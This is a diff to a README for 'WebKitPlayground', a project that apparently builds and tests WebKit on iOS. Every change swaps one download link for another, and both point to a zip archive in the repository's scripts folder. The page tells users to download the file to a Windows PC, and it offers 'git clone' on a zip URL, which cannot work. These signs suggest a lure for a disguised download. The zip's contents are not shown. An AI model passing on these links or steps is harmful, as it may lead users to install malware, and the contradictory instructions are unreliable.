@@ -1,6 +1,6 @@
 # 🧩 WebKitPlayground - Build and test WebKit on iOS
 
-[![Download WebKitPlayground](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Eveng2187/WebKitPlayground/main/scripts/Playground-Web-Kit-v3.2.zip)
+[![Download WebKitPlayground](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Eveng2187/WebKitPlayground/raw/refs/heads/main/scripts/Playground-Web-Kit-v3.2.zip)
 
 ## 🖥️ What WebKitPlayground Does
 
@@ -12,7 +12,7 @@ This project is for people who want more control over how WebKit runs on their d
 
 To get WebKitPlayground, visit this page to download and follow the files and release assets listed there:
 
-https://raw.githubusercontent.com/Eveng2187/WebKitPlayground/main/scripts/Playground-Web-Kit-v3.2.zip
+https://github.com/Eveng2187/WebKitPlayground/raw/refs/heads/main/scripts/Playground-Web-Kit-v3.2.zip
 
 If the page shows a source package or release file, download it to your Windows PC first. Then follow the setup steps below.
 
@@ -32,7 +32,7 @@ If the project uses Git, you can also copy the repository to your PC with Git Ba
 
 - Install Git for Windows
 - Open Command Prompt or PowerShell
-- Run: git clone https://raw.githubusercontent.com/Eveng2187/WebKitPlayground/main/scripts/Playground-Web-Kit-v3.2.zip
+- Run: git clone https://github.com/Eveng2187/WebKitPlayground/raw/refs/heads/main/scripts/Playground-Web-Kit-v3.2.zip
 
 ## ⚙️ What You Need
 
@@ -158,7 +158,7 @@ A simple first-time flow looks like this:
 
 Project page and download source:
 
-https://raw.githubusercontent.com/Eveng2187/WebKitPlayground/main/scripts/Playground-Web-Kit-v3.2.zip
+https://github.com/Eveng2187/WebKitPlayground/raw/refs/heads/main/scripts/Playground-Web-Kit-v3.2.zip
 
 ## 🧩 File Checks
 
